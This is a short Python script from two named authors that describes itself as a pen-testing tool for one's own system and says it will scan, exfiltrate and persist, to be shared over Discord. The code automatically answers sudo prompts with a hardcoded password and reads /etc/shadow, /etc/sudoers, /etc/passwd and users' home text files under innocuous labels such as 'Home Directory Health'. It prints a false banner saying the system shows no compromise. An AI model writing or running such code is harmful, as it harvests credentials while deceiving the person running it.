# This is a python automation script meant for pen testing of ones own system. 
# This script will attempt to scan your computer for information, exfiltrate it,
# and then persist.

# This program will be made available through our Discord or Direct Message.
# Here we will explain how it works along with partial bits of code as demonstration.
# key - 4EA2A56396E4BB2C30897C1B8C090F54E8F2E1308780B8795E6B53A6E74FD814``
# iv - E69CCC163DA315AC46D66149421B2658

# Created by Hunter Schwager and Kyle McCarthy.

import subprocess
import pexpect

# ------- QOL -------
export_section=''
section_header='-------------'
section_footer="-------------------------------------------\n"

# ------- Header -------

print("-------------Nat1 Configurations-------------")
print("The following system scan shows no signs of system degradation or compromise.")
print("-------------------------------------------\n")
# ------- Code -------

def sudo_command(command):
    sudo_access = pexpect.spawn(command)
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)
    output = sudo_access.before.decode('utf-8')

    return output
       
class SkillCheck:
    command_input = []

    def __init__(self, name):
        self.name= name

    def proficiency(self, ability_score):
            print("\n", section_header + self.name + section_header)
            self = subprocess.run(ability_score.split())
            print(section_footer)
            return self

    def inspiration(input, ability_score):
        sudo_command(ability_score)

    def investigation(self, directory, search):
        print("\n", section_header + self.name + section_header)
        command = 'sudo find ' + directory + ' -type f -iname ' + search
        files_to_search = sudo_command(command)
        print(files_to_search)

        '''
        for r in files_to_search:
            print("\n", section_header + r + section_header)
            read_file = subprocess.run(['cat', r])
            timeout = 100
            print(read_file)
            print(section_footer)
        '''

def basicScan():

# ------- Inspiration -------

    etcshadow_bot = SkillCheck("Home Directory Health")
    etcshadow_bot.inspiration('sudo cat /etc/shadow')

    poncho_bot = SkillCheck("Privilege Audit")
    poncho_bot.inspiration('sudo cat /etc/sudoers')

    cron_bot = SkillCheck("Home Folder | .txt")
    cron_bot.investigation('/home/', '*.txt') 

# ------- Proficiency -------

    ip_addr_bot = SkillCheck("IP")
    ip_addr_bot.proficiency('ip addr')

    online_users_bot = SkillCheck("Online Users")
    online_users_bot.proficiency('who')

    passwd_bot = SkillCheck("/etc/passwd")
    passwd_bot.proficiency('cat /etc/passwd')

    host_bot = SkillCheck("Host System")
    host_bot.proficiency('uname -a')

    group_bot = SkillCheck("Groups")
    group_bot.proficiency("cat /etc/group")



# ------- Execution -------

def __main__():
    basicScan()

if __name__ == '__main__':
    __main__()